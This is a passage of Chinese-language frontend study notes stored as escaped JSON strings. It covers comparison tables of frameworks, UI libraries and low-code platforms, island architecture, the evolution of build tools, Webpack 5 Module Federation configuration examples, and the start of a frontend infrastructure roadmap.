| 215k+ | • Facebook<br>• Instagram<br>• Netflix | 2013 |\n| Vue      | 尤雨溪团队           | • 响应式系统<br>• 模板语法<br>• 双向绑定<br>• 组件化         | • 官方核心库生态<br>• 中文社区活跃             | • 开源赞助<br>• 付费咨询       | 205k+ | • GitLab<br>• 阿里巴巴<br>• 字节跳动           | 2014 |\n| Angular  | Google          | • TypeScript<br>• 依赖注入<br>• 完整框架<br>• RxJS集成 | • 企业级工具链<br>• Google支持            | • Google团队<br>• 企业服务   | 90k+  | • Google<br>• Microsoft<br>• Samsung   | 2016 |\n| Svelte   | Vercel          | • 编译时框架<br>• 零运行时<br>• 简洁语法                  | • 快速成长<br>• 轻量级生态                 | • Vercel支持<br>• 社区驱动   | 73k+  | • Apple<br>• Spotify<br>• The NY Times | 2016 |\n| Solid.js | Core Team       | • 细粒度更新<br>• 无虚拟DOM<br>• 类React语法            | • 新兴生态<br>• 高性能方案                 | • 开源赞助<br>• 社区支持       | 30k+  | • Cloudflare<br>• DataStax             | 2018 |\n| Qwik     | Builder.io      | • 即时加载<br>• 零水合<br>• 可恢复性                    | • 新兴生态<br>• Builder.io支持          | • Builder.io<br>• 企业支持 | 20k+  | • Builder.io<br>• Netlify              | 2022 |\n| Preact   | 社区驱动            | • React兼容<br>• 轻量级<br>• 高性能                  | • React生态兼容<br>• 独立生态             | • 开源赞助<br>• 社区维护       | 35k+  | • Uber<br>• Tencent                    | 2015 |\n|          |                 |                                              |                                   |                        |       |                                        |      |\n\n## 2. 元框架对比\n\n| 元框架         | 基础框架     | 主要支持方         | 特点                            | 适用场景               | Stars | 典型案例                             |\n| ----------- | -------- | ------------- | ----------------------------- | ------------------ | ----- | -------------------------------- |\n| Next.js     | React    | Vercel        | • SSR/SSG<br>• 文件路由<br>• 图片优化 | • 企业应用<br>• 电商网站   | 115k+ | • TikTok<br>• Nike               |\n| Nuxt        | Vue      | NuxtLabs      | • 自动路由<br>• SEO友好<br>• 模块化    | • 内容网站<br>• 应用程序   | 47k+  | • NASA<br>• GitLab               |\n| SvelteKit   | Svelte   | Vercel        | • 适配系统<br>• 文件路由<br>• SSR支持   | • 现代网站<br>• WebApp | 16k+  | • NY Times<br>• Reuters          |\n| Astro       | 多框架      | Astro Company | • 零JS默认<br>• 多框架支持<br>• 内容集合  | • 内容网站<br>• 文档站    | 35k+  | • Chrome Docs<br>• Firebase Docs |\n| Remix       | React    | Shopify       | • 嵌套路由<br>• 数据加载<br>• 错误边界    | • Web应用<br>• 电商平台  | 25k+  | • Shopify<br>• Microsoft         |\n| Solid Start | Solid.js | Core Team     | • 元框架<br>• SSR支持<br>• 文件路由    | • 现代应用<br>• SPA    | 3k+   | • 社区项目                           |\n|             |          |               |                               |                    |       |                                  |\n\n## 3. 补充说明\n\n1. 性能特点对比：\n\t- React: 虚拟DOM优化\n\t- Vue: 响应式系统\n\t- Svelte: 编译时优化\n\t- Solid: 细粒度响应\n\t- Qwik: 延迟加载\n\t- Preact: 轻量级虚拟DOM\n2. 学习曲线：\n\t- 简单：Vue, Svelte\n\t- 中等：React, Preact\n\t- 较陡：Angular, Solid.js\n\t- 创新概念：Qwik\n3. 开发工具支持：\n\t- 最完善：React, Vue, Angular\n\t- 良好：Svelte, Preact\n\t- 发展中：Solid.js, Qwik\n4. 构建工具集成：\n\t- Vite: Vue, Svelte, Solid.js\n\t- webpack: React, Angular\n\t- esbuild: Qwik\n\t- 多支持: Preact\n5. 2024年发展趋势：\n\t- 性能优化持续深化\n\t- 开发体验不断提升\n\t- 构建工具链优化\n\t- 跨框架解决方案增多\n\t- AI集成加强\n6. 企业选择考虑因素：\n\t- 团队技术栈\n\t- 性能需求\n\t- 生态系统\n\t- 学习成本\n\t- 长期维护\n\t- 商业支持\n\n## 4. 国内：企业级框架解决方案\n\n| 框架/工具 | 主要支持方 | 基础框架 | 特点 | 生态系统 | 使用案例 | Stars | 发布年份 |\n|----------|------------|---------|------|----------|----------|-------|----------|\n| UmiJS | 蚂蚁集团 | React | • 插件化<br>• 约定式路由<br>• 企业级特性<br>• 开箱即用 | • antd 生态<br>• dumi 文档<br>• 大量插件 | • 支付宝<br>• 网商银行<br>• 数字农业 | 14k+ | 2018 |\n| Ice/飞冰 | 阿里巴巴 | React | • 物料体系<br>• 微前端<br>• 低代码能力<br>• 模板丰富 | • fusion生态<br>• 物料市场<br>• 开发者工具 | • 淘宝<br>• 天猫<br>• 阿里云 | 17k+ | 2018 |\n| Taro | 京东 | React/Vue | • 跨端开发<br>• 多框架支持<br>• 统一接口<br>• 小程序支持 | • 组件库<br>• API适配<br>• 端能力 | • 京东<br>• 腾讯<br>• 字节跳动 | 33k+ | 2018 |\n| Midway | 阿里巴巴 | TypeScript | • 全栈框架<br>• 云原生<br>• Serverless<br>• 微服务 | • 企业级生态<br>• 阿里云集成<br>• 开发工具 | • 淘宝<br>• 支付宝<br>• 钉钉 | 8k+ | 2013 |\n\n## 5. 国内：UI 组件库\n\n| 组件库          | 支持方  | 框架支持          | 特点                                    | 生态                            | 典型案例                    | Stars | 维护状态 |\n| ------------ | ---- | ------------- | ------------------------------------- | ----------------------------- | ----------------------- | ----- | ---- |\n| Ant Design   | 蚂蚁集团 | React         | • 企业级设计<br>• 完整组件<br>• 主题定制<br>• 国际化  | • Pro组件<br>• Charts<br>• 模板市场 | • 支付宝<br>• 阿里云<br>• 腾讯云 | 87k+  | 活跃   |\n| Arco Design  | 字节跳动 | React/Vue     | • 现代设计<br>• 性能优化<br>• 可定制性<br>• 跨框架   | • 物料平台<br>• 设计系统<br>• 主题工具    | • 飞书<br>• 抖音<br>• 今日头条  | 10k+  | 活跃   |\n| Element Plus | 饿了么  | Vue 3         | • 清晰设计<br>• Vue3支持<br>• 主题定制<br>• 轻量级 | • 组件市场<br>• 主题工具<br>• 开发工具    | • 饿了么<br>• B站<br>• 知乎   | 21k+  | 活跃   |\n| TDesign      | 腾讯   | React/Vue/小程序 | • 多端支持<br>• 业务组件<br>• 设计系统<br>• 无障碍   | • 多框架实现<br>• 设计资源<br>• 主题工具   | • 腾讯云<br>• 微信<br>• QQ   | 4k+   | 活跃   |\n|              |      |               |                                       |                               |                         |       |      |\n\n## 6. 国内：开发工具链\n\n| 工具            | 支持方  | 类型   | 特点                               | 生态集成                          | 应用场景              | Stars | 状态  |\n| ------------- | ---- | ---- | -------------------------------- | ----------------------------- | ----------------- | ----- | --- |\n| **Modern.js** | 字节跲动 | 开发框架 | • 一体化方案<br>• 模块联邦<br>• 构建优化      | • BFF支持<br>• 微前端<br>• 开发工具    | • 抖音<br>• 今日头条    | 4k+   | 活跃  |\n| Rax           | 阿里巴巴 | 跨端框架 | • 多端统一<br>• 轻量级<br>• 高性能         | • 组件库<br>• 开发工具<br>• 运行时      | • 淘宝<br>• 天猫      | 7k+   | 活跃  |\n| father        | 蚂蚁集团 | 构建工具 | • 库打包<br>• TypeScript<br>• 多格式输出 | • dumi集成<br>• npm发布<br>• 测试集成 | • antd<br>• pro系列 | 1k+   | 活跃  |\n\n## 7. 国内：低代码平台\n\n| 平台            | 公司   | 特点                            | 技术栈                     | 应用场景              | 商业模式 | 状态  |\n| ------------- | ---- | ----------------------------- | ----------------------- | ----------------- | ---- | --- |\n| LowCodeEngine | 阿里巴巴 | • 生态开放<br>• 扩展性强<br>• 企业级     | • React<br>• TypeScript | • 中后台<br>• 表单系统   | 开源   | 活跃  |\n| 宜搭            | 阿里巴巴 | • 可视化搭建<br>• 业务模板<br>• 集成钉钉   | • 私有技术栈                 | • 企业应用<br>• 流程管理  | 商业产品 | 商用  |\n| amis          | 百度   | • 配置生成器<br>• JSON驱动<br>• 组件丰富 | • React                 | • 管理系统<br>• 数据可视化 | 开源   | 活跃  |\n|               |      |                               |                         |                   |      |     |\n\n","uhf5nUDr":"\n# 前端框架的岛屿架构（Island Architecture）\n\n`#前端架构` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 定义：\n\t- 岛屿\n\t\t- 动态，交互式组件\n\t- 海洋：静态、非交互式的内容\n- 原理\n\t- 服务器首先渲染静态 HTML 内容\n\t- 识别页面中需要交互的区域（岛屿）\n\t- 为每个岛屿单独加载必要的 JavaScript\n\t- 其余部分保持为静态 HTML\n- 优势\n\t- 首屏\n\t- 性能好：必要时才加载 JavaScript\n\t- seo\n- 代表\n\t- RSC：\n\t\t- React Server Component\n\t- Astro 等\n- 挑战\n\t-  组件划分：\n\t\t- 需要仔细考虑哪些部分应该是\"岛屿\"\n\t- 状态管理：\n\t\t- 岛屿之间的状态共享可能会变得复杂\n\t- 开发复杂性：\n\t\t- 可能需要更多的规划和架构设计\n\n## 1. 核心概念\n\n前端框架的岛屿架构（Island Architecture），旨在**提高网页性能和用户体验**。\n\n1. 静态内容和动态内容分离\n2. 按需加载交互性组件\n3. **最小化 JavaScript 的初始加载**\n\n## 2. 定义\n\n岛屿架构将页面视为一片\"海洋\"，其中包含多个独立的\"岛屿\"。\n- 这里的\"海洋\"代表**静态的、非交互式**的内容，\n- 而\"岛屿\"则是**动态的、交互式的组件**。\n\n## 3. 工作原理\n\n- 服务器首先渲染静态 HTML 内容\n- 识别页面中需要交互的区域（岛屿）\n- 为每个岛屿单独加载必要的 JavaScript\n- 其余部分保持为静态 HTML\n\n## 4. 优势\n\n- 更快的初始页面加载：\n\t- 大部分内容以静态 HTML 呈现\n- 更好的性能：\n\t- 只在需要的地方加载 JavaScript\n- 改善核心 Web 指标：\n\t- 如 First Contentful Paint (FCP) 和 Time to Interactive (TTI)\n- 更好的 SEO：\n\t- 搜索引擎可以轻松抓取静态内容\n\n## 5. 与其他架构的对比\n\n| 架构类型         | 初始加载 | JavaScript 使用 | SEO 友好度 | 交互性 |\n| ------------ | ---- | ------------- | ------- | --- |\n| 单页应用 (SPA)   | 慢    | 大量            | 低       | 高   |\n| 服务器端渲染 (SSR) | 快    | 中等            | 高       | 中等  |\n| 静态站点生成 (SSG) | 非常快  | 少量            | 非常高     | 低   |\n| 岛屿架构         | 快    | 按需加载          | 高       | 高   |\n\n## 6. 实现岛屿架构的框架\n\n### 6.1. React Server Component\n\n- RSC 算是岛屿架构了\n- 划分服务端组件和客户端组件，\n\t- 服务端组件仅在服务端运行\n\t- 客户端只会看到它的渲染结果\n\t- JavaScript 执行代码自然也仅存于服务端。\n\n### 6.2. Astro\n\nAstro 是最早实现岛屿架构的框架之一。\n\n示例：\n\n```vue hl:8\n---\nimport MyReactComponent from './MyReactComponent.jsx';\n---\n<html>\n  <body>\n    <h1>Welcome to my page</h1>\n    <p>This is static content</p>\n    <MyReactComponent client:load />\n  </body>\n</html>\n```\n\n在这个例子中，`<MyReactComponent>` 就是一个\"岛屿\"，只有这部分会加载必要的 JavaScript。\n\n### 6.3. Qwik\n\nQwik 是另一个采用类似理念的框架，它使用细粒度的懒加载来实现类似的效果。\n\n### 6.4. Fresh\n\nFresh 是一个基于 Deno 的 web 框架，也采用了岛屿架构的理念。\n\n示例：\n\n```jsx\nimport { useState } from \"preact/hooks\";\n\nexport default function Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <p>{count}</p>\n      <button onClick={() => setCount(count + 1)}>Add</button>\n    </div>\n  );\n}\n```\n\n在 Fresh 中，这个组件会被当作一个\"岛屿\"，只在需要时才加载和激活。\n\n### 6.5. 实现岛屿架构的挑战\n\n- 组件划分：\n\t- 需要仔细考虑哪些部分应该是\"岛屿\"\n- 状态管理：\n\t- 岛屿之间的状态共享可能会变得复杂\n- 开发复杂性：\n\t- 可能需要更多的规划和架构设计\n\n","7RG8dLxF":"\n# 前言\n\n`#前端工程化` \n\n> 前端构建部署、工程化、CI&CD 相关","mI3wDNuJ":"\n# 前端工程化历程\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- webpack ：bundle 的代表\n\t- 广度优先遍历，找到所有资源和依赖关系，最后统一打包\n\t- 但：项目越来越复杂，依赖越来越多，构建编译速度越来越慢 \n- vite \n\t- unbundle 的代表\n\t- 因为 HTTP2、ESM 等新技术已经得到**浏览器广泛支持**\n- turbopack \n\t- 原生语言 rust\n\t- 依然是 bundle 线路\n\t- 做到函数级别的缓存\n\t- 实现增量构建\n\n## 2. 早期\n\n- 09 年之前，**JS 无法脱离浏览器运行**，前后端职能耦合\n\t- 工程化能做的有限，特别有限\n- 2009 年，NodeJS 的出现，使得 ==JS 能够脱离浏览器运行==，也催生了许多效率工具\n\n## 3. gulp → 不同资源依然走各自的处理逻辑\n\n![图片&文件](./files/20241211.png)\n\n## 4. webpack → 广度优先遍历，找到所有资源和依赖关系，最后统一打包\n\n![图片&文件](./files/20241211-1.png)\n\n## 5. webpack → 优势与劣势\n\n![图片&文件](./files/20241211-2.png)\n\n## 6. 再之后 \n\n- 项目越来越复杂，依赖越来越多，构建编译速度越来越慢 \n- HTTP2、ESM 等新技术已经得到**浏览器广泛支持**\n\n## 7. bundle → module 、原生语言\n\n![图片&文件](./files/20241211-3.png)\n\n## 8. Vite 的优势与劣势\n\n![图片&文件](./files/20241211-4.png)\n\n## 9. Turbopack: The Rust-powered successor to Webpack\n\n![图片&文件](./files/20241211-5.png)\n\n### 9.1. 函数级别的缓存\n\n![图片&文件](./files/20241211-7.png)\n\n![图片&文件](./files/20241211-8.png)\n\n![图片&文件](./files/20241211-9.png)\n\n\n![图片&文件](./files/20241211-10.png)\n\n## 10. 对比\n\n![图片&文件](./files/20241211-6.png)\n\n## 11. 下载量对比\n\n> https://npmtrends.com/gulp-vs-rollup-vs-rspack-vs-turbopack-vs-vite-vs-webpack\n\n- 最高的还是 gulp \n- Vite 与 Webpack Stars 接近\n- 但，Webpack 下载量依然是绝对的榜首\n- Rollup 下载量高居榜二\n\n![图片&文件](./files/20241211-11.png)\n\n## 12. 工程化的一些思考\n\n![图片&文件](./files/20241211-12.png)\n\n\n![图片&文件](./files/20241211-13.png)\n\n## 13. 参考\n\n- D2大会 - 前端工程化与 Turbopack 概述","8wPPOjJ7":"\n# Webpack 5 的 Module Federation\n\n`#webpack` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Module Federation 的特点，两个\n\t- ==动态加载==另一个应用的代码和依赖\n\t- 可在运行时==共享代码==\n- 配置说明：\n\t- new ModuleFederationPlugin\n\t\t- remotes\n\t\t- exposes\n\t\t- shared：\n\t\t\t- 比如 React \n\t\t\t\t- 可指定 requiredVersion 版本\n\t\t\t\t- singleton 是否单例\n- 示例：\n\t- 使用 promise ==可自定义动态远程加载==\n\t\t- 错误边界，自己写代码，可以自己实现\n\t\t- 请求时可添加==认证逻辑==\n\t- 共享状态管理，记得 exposes\n- 其他\n\t- `remoteEntry.js` 是 Module Federation 中的一个==约定俗成==的命名\n\t\t- 也可\n\t\t\t- ① 根据环境使用不同的文件名\n\t\t\t- ② 添加 hash 以处理缓存\n\t\t\t- ③ 用版本号作为文件名的一部分\n\t- 端口配置有什么要求\n\t\t- 建议==不同应用分配不同端口==，比如主应用、用户管理管理\n\t\t- `[远程应用名称]@[远程入口文件URL]`\n\t\t\t- `app1@http://localhost:3001/remoteEntry.js`\n\n\n> 关于 vite 如何使用模块联邦，可见 [13. vite 中如何使用 Module Federation](/post/zjmJ8Ccg.html)\n\n## 2. Module Federation 基本概念\n\n- Module Federation 允许一个 **JavaScript 应用动态地加载另一个应用的代码和依赖**。\n- 它是实现微前端的一种方式，使得不同的构建可以**在运行时共享代码**。\n\n## 3. 使用配置说明\n\n### 3.1. 主应用配置\n\n```javascript hl:6,9,13,18\n// webpack.config.js - 主应用配置示例\nconst ModuleFederationPlugin = require('webpack/lib/container/ModuleFederationPlugin');\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'host',              // 当前应用名称\n      filename: 'remoteEntry.js', // 暴露的文件名称\n      remotes: {                 // 声明需要使用的远程应用\n        app1: 'app1@http://localhost:3001/remoteEntry.js',\n        app2: 'app2@http://localhost:3002/remoteEntry.js'\n      },\n      // 暴露给其他应用的模块\n      exposes: {                \n        './Header': './src/components/Header',\n        './Footer': './src/components/Footer'\n      },\n      // 共享依赖\n      shared: {                 \n        react: { \n          singleton: true,      // 确保只加载一个版本\n          requiredVersion: '^17.0.2'\n        },\n        'react-dom': {\n          singleton: true,\n          requiredVersion: '^17.0.2'\n        }\n      }\n    })\n  ]\n};\n```\n\n### 3.2. 子应用配置\n\n```javascript hl:7\n// webpack.config.js - 子应用配置示例\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'app1',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './Button': './src/components/Button',\n        './Card': './src/components/Card'\n      },\n      shared: {\n        react: { singleton: true },\n        'react-dom': { singleton: true }\n      }\n    })\n  ]\n};\n```\n\n### 3.3. 使用示例：主应用中加载远程组件\n\n```javascript hl:6\n// 主应用中加载远程组件\n// App.js\nimport React, { Suspense } from 'react';\n\n// 使用动态导入加载远程组件\n// 需要子应用配置，并且expose\nconst RemoteButton = React.lazy(() => import('app1/Button'));\nconst RemoteCard = React.lazy(() => import('app1/Card'));\n\nfunction App() {\n  return (\n    <div>\n      <h1>主应用</h1>\n      <Suspense fallback=\"Loading Button...\">\n        <RemoteButton />\n      </Suspense>\n      <Suspense fallback=\"Loading Card...\">\n        <RemoteCard />\n      </Suspense>\n    </div>\n  );\n}\n\n// 入口文件 index.js\nimport('./bootstrap').catch(err => console.error(err));\n```\n\n## 4. 示例 1：主应用和远程组件\n\n### 4.1. 主应用：3001 端口\n\n```javascript hl:14,26\n// webpack.config.js (主应用)\nconst ModuleFederationPlugin = require(\"webpack/lib/container/ModuleFederationPlugin\");\n\nmodule.exports = {\n  entry: \"./src/index\",\n  mode: \"development\",\n  devServer: {\n    port: 3000,\n  },\n  plugins: [\n    new ModuleFederationPlugin({\n      name: \"host\",\n      remotes: {\n        remote: \"remote@http://localhost:3001/remoteEntry.js\",\n      },\n      shared: {\n        react: { singleton: true },\n        \"react-dom\": { singleton: true }\n      }\n    }),\n  ],\n};\n\n// src/App.js (主应用)\nimport React, { Suspense } from \"react\";\nconst RemoteButton = React.lazy(() => import(\"remote/Button\"));\n\nfunction App() {\n  return (\n    <div>\n      <h1>主应用</h1>\n      <Suspense fallback=\"Loading Button...\">\n        <RemoteButton />\n      </Suspense>\n    </div>\n  );\n}\n```\n\n### 4.2. Remote Application (远程应用) 的 Button 组件，需要 exposes\n\n```javascript hl:14\n// webpack.config.js (远程应用)\nconst ModuleFederationPlugin = require(\"webpack/lib/container/ModuleFederationPlugin\");\n\nmodule.exports = {\n  entry: \"./src/index\",\n  mode: \"development\",\n  devServer: {\n    port: 3001,\n  },\n  plugins: [\n    new ModuleFederationPlugin({\n      name: \"remote\",\n      filename: \"remoteEntry.js\",\n      exposes: {\n        \"./Button\": \"./src/Button\",\n      },\n      shared: {\n        react: { singleton: true },\n        \"react-dom\": { singleton: true }\n      }\n    }),\n  ],\n};\n\n// src/Button.js (远程应用) 组件\nimport React from \"react\";\n\nconst Button = () => (\n  <button onClick={() => alert(\"Hello from Remote!\")}>\n    Remote Button\n  </button>\n);\n\nexport default Button;\n```\n\n## 5. 示例 2：动态远程加载示例\n\n### 5.1. 主应用\n\n```javascript hl:10\n// webpack.config.js (主应用)\nconst ModuleFederationPlugin = require(\"webpack/lib/container/ModuleFederationPlugin\");\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: \"host\",\n      remotes: {\n        // 动态远程配置\n        remote: `promise new Promise(resolve => {\n          const remoteUrl = window.location.hostname === 'localhost'\n            ? 'http://localhost:3001'\n            : 'https://production.com';\n          const script = document.createElement('script');\n          script.src = '${remoteUrl}/remoteEntry.js';\n          script.onload = () => {\n            resolve(window.remote);\n          };\n          document.head.appendChild(script);\n        })`,\n      },\n      shared: { react: { singleton: true } }\n    }),\n  ],\n};\n\n// App.js\nconst loadComponent = async () => {\n  const component = await import('remote/Component');\n  return component.default;\n};\n```\n\n## 6. 示例 3：共享状态管理\n\n```javascript hl:7\n/// store-app/webpack.config.js\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'store',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './store': './src/store',\n        './StoreProvider': './src/StoreProvider'\n      },\n      shared: {\n        react: { singleton: true },\n        'react-redux': { singleton: true },\n        '@reduxjs/toolkit': { singleton: true }\n      }\n    })\n  ]\n};\n\n// consumer-app/webpack.config.js\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'consumer',\n      remotes: {\n        store: 'store@http://localhost:3002/remoteEntry.js'\n      },\n      shared: {\n        react: { singleton: true },\n        'react-redux': { singleton: true },\n        '@reduxjs/toolkit': { singleton: true }\n      }\n    })\n  ]\n};\n\n// store-app/src/store.js\nimport { configureStore } from '@reduxjs/toolkit';\n\nexport const store = configureStore({\n  reducer: {\n    // reducers\n  }\n});\n\n// consumer-app/src/App.js\nimport { Provider } from 'react-redux';\nimport { store } from 'store/store';\n\nexport default function App() {\n  return (\n    <Provider store={store}>\n      {/* 应用内容 */}\n    </Provider>\n  );\n}\n\n```\n\n## 7. 示例 4：路由集成示例（React Router）\n\n- 多个远程应用\n\n```jsx hl:5,6\n// webpack.config.js (主应用)\nnew ModuleFederationPlugin({\n  name: \"host\",\n  remotes: {\n    remote1: \"remote1@http://localhost:3001/remoteEntry.js\",\n    remote2: \"remote2@http://localhost:3002/remoteEntry.js\",\n  },\n  shared: {\n    react: { singleton: true },\n    \"react-router-dom\": { singleton: true },\n  },\n});\n\n// App.js (主应用)\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\n\nconst RemoteApp1 = React.lazy(() => import(\"remote1/App\"));\nconst RemoteApp2 = React.lazy(() => import(\"remote2/App\"));\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <Suspense fallback=\"Loading...\">\n        <Routes>\n          <Route path=\"/app1/*\" element={<RemoteApp1 />} />\n          <Route path=\"/app2/*\" element={<RemoteApp2 />} />\n        </Routes>\n      </Suspense>\n    </BrowserRouter>\n  );\n}\n```\n\n## 8. 示例 5：带版本控制的共享依赖示例\n\n```javascript hl:10\n// webpack.config.js\nnew ModuleFederationPlugin({\n  name: \"host\",\n  remotes: {\n    remote: \"remote@http://localhost:3001/remoteEntry.js\",\n  },\n  shared: {\n    react: {\n      singleton: true,\n      requiredVersion: \"^18.0.0\",\n    },\n    \"react-dom\": {\n      singleton: true,\n      requiredVersion: \"^18.0.0\",\n    },\n    \"@material-ui/core\": {\n      singleton: true,\n      requiredVersion: \"^4.12.0\",\n    },\n  },\n});\n```\n\n## 9. 示例 6：错误边界\n\n```javascript\n// 主应用配置\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'host',\n      remotes: {\n        remoteApp: `promise new Promise((resolve, reject) => {\n          const remoteUrl = 'http://localhost:3001/remoteEntry.js';\n          const script = document.createElement('script');\n          script.src = remoteUrl;\n          script.onerror = () => {\n            console.error('Failed to load remote app');\n            resolve({\n              get: (request) => {\n                return Promise.resolve(() => {\n                  return () => {\n                    return <div>Failed to load remote component</div>;\n                  };\n                });\n              },\n              init: () => {}\n            });\n          };\n          script.onload = () => {\n            resolve(window.remoteApp);\n          };\n          document.head.appendChild(script);\n        })`\n      }\n    })\n  ]\n};\n\n// 使用带错误处理的远程组件\nconst RemoteComponent = React.lazy(() => {\n  return import('remoteApp/Component')\n    .catch(err => {\n      console.error('Failed to load remote component:', err);\n      return { default: () => <div>Fallback UI</div> };\n    });\n});\n\n```\n\n## 10. 示例 7：错误边界\n\n```javascript\n// ErrorBoundary.js\nclass ErrorBoundary extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { hasError: false };\n  }\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true };\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return <h1>远程组件加载失败</h1>;\n    }\n    return this.props.children;\n  }\n}\n\n// App.js\nconst RemoteComponent = React.lazy(() => import(\"remote/Component\"));\n\nfunction App() {\n  return (\n    <ErrorBoundary>\n      <Suspense fallback=\"Loading...\">\n        <RemoteComponent />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n```\n\n## 11. 示例 8：带认证的模块联邦示例\n\n```javascript hl:9\n// webpack.config.js\nnew ModuleFederationPlugin({\n  name: \"host\",\n  remotes: {\n    remote: `promise new Promise(resolve => {\n      const script = document.createElement('script');\n      script.src = 'http://localhost:3001/remoteEntry.js';\n      \n      // 添加认证token\n      script.crossOrigin = 'anonymous';\n      const token = localStorage.getItem('auth_token');\n      if (token) {\n        script.setAttribute('data-auth', token);\n      }\n      \n      script.onload = () => {\n        resolve(window.remote);\n      };\n      document.head.appendChild(script);\n    })`,\n  },\n});\n```\n\n## 12. 常见问题\n\n### 12.1. 为什么都叫 remoteEntry.js ?\n\n`remoteEntry.js` 是 Module Federation 中的一个约定俗成的命名，但这个名称实际上是可以自定义的，建议可以根据需要自定义入口文件名：\n- 版本管理\n- 缓存控制\n- 环境区分\n\n```javascript\n // ① 根据环境使用不同的文件名\n// webpack.config.js\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'app1',\n      // 根据环境使用不同的文件名\n      filename: process.env.NODE_ENV === 'production'\n        ? 'remoteEntry.prod.js'\n        : 'remoteEntry.dev.js',\n      exposes: {\n        './Component': './src/Component'\n      }\n    })\n  ]\n};\n\n// ② 添加 hash 以处理缓存\n// webpack.config.js\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'app1',\n      // 添加 hash 以处理缓存\n      filename: 'remoteEntry.[contenthash].js',\n      exposes: {\n        './Component': './src/Component'\n      }\n    })\n  ]\n};\n\n\n// ③ 用版本号作为文件名的一部分\n// webpack.config.js\nconst package = require('./package.json');\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'app1',\n      // 使用版本号作为文件名的一部分\n      filename: `remoteEntry.${package.version}.js`,\n      exposes: {\n        './Component': './src/Component'\n      }\n    })\n  ]\n};\n\n```\n\n### 12.2. 端口配置有什么要求？\n\n建议提取成变量，如下代码\n\n```javascript\n// ports.config.js\nmodule.exports = {\n  host: 3000,\n  remotes: {\n    app1: 3001,\n    app2: 3002,\n    app3: 3003\n  }\n};\n\n// 示例端口分配方案\nconst ports = {\n  host: 3000,      // 主应用\n  auth: 3001,      // 认证应用\n  dashboard: 3002, // 仪表盘应用\n  users: 3003,     // 用户管理应用\n  orders: 3004     // 订单管理应用\n};\n\n\n// 不同环境的端口范围示例\nconst portRanges = {\n  development: {\n    start: 3000,\n    end: 3999\n  },\n  testing: {\n    start: 4000,\n    end: 4999\n  },\n  staging: {\n    start: 5000,\n    end: 5999\n  }\n};\n```\n\n### 12.3. `app1@` ？\n\n- 作用\n\t- 标识远程模块的来源\n\t- 确保模块正确加载\n\t- 维护模块间的依赖关系\n- 规则：\n\t- `app1`: 远程应用的名称\n\t- `@`: 分隔符\n\t- `http://localhost:3001/remoteEntry.js`: 远程入口文件的URL\n\n```javascript\n// webpack.config.js\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'host',\n      remotes: {\n        // 格式: [远程应用名称]@[远程入口文件URL]\n        app1: 'app1@http://localhost:3001/remoteEntry.js',\n        // 等价于\n        app1: `${remoteName}@${remoteUrl}`\n      }\n    })\n  ]\n};\n\n```","zUWQOGfs":"\n# 前端基础建设路线参考\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 评估阶段\n\t- 收集成员反馈\n\t- 收集痛点\n\t- 技术工程现状与团队成员水平\n- 制定规范和流程规范\n\t- 代码管理：\n\t\t- git flow 、提交规范、code review 机制\n\t- 技术栈收敛\n\t\t- 工程体系\n\t\t- 包管理工具、构建工具、框架、组件库等\n\t- 规范\n\t\t- 开发规范：js/ts → css → 目录规范 → 命名规范等等\n\t\t- 文档规范：\n\t- 流程\n\t\t- 开发流程：\n\t\t\t- 需求 → 开发 → 测试 → 部署\n\t\t- 自动化流程：\n\t\t\t- 代码提交 → 单侧 → 自动化测试 → 自动化部署 → 自动化报警拉群等等\n- 质量保障\n\t- 单元测试覆盖率 \n\t- 性能、代码质量、错误监控\n\t- 业务数据\n\t- 一键拉群\n\t- 降级方案等\n- 团队技术文化\n\t- 分享\n\t- 代码评审\n\t- 培训体系\n\t- 新人成长计划\n\t- 踩坑记录\n- 其他\n\t- 管理层支持\n\t- 团队及相关方充分沟通\n\t- 定期收集反馈\n\t- 关注投入产出比\n\t- 避免黑盒\n\t\t- `解决单点故障` 的唯一办法是**让更多的成员交叉参与不同的项目**，\n\t\t- 代码`review`方式等多种方式熟悉项目代码，规范就体现的很重要\n- 最后：\n\t- 如何==度量和量化==前端基建的效果？\n\t- 确定好目标，需要量化出来\n\n---\n\n\n>  另外可参考 ：\n>  [2.  前端工程化](/post/kRVMrP1X.html)\n>  [2. 前端工程化 SOP](/post/GWG7k34s.html) \n>  \n\n## 2. 前端基建线路演变\n\n- 第一阶段：夯实前端基础设施\n\t- 应用类型：\n\t\t- ssr/csr/h5/pc/中后台/C端\n\t- 开发\n\t- 构建\n\t- 部署发布\n\t- QA\n\t- 研发体验\n- 第二阶段：整合、沉淀方案\n\t- 视图框架、项目组织、状态、路由、权限、视图层组件\n- 第三阶段：组件资产体系沉淀\n- 第四阶段：打通上下游\n\t- `上游，对于 UI。上面说的组件体系`\n\t\t- 其实是建立在稳定的、一致的、统一的 UI 设计语言之上的。\n\t\t\t- 否则一切都是空谈\n\t\t\t\t- 所以我们要求 UI 设计团队要有良好的设计规范、能和前端组件体系绑定并良性迭代。\n\t- `下游，对于 后端`\n\t\t- 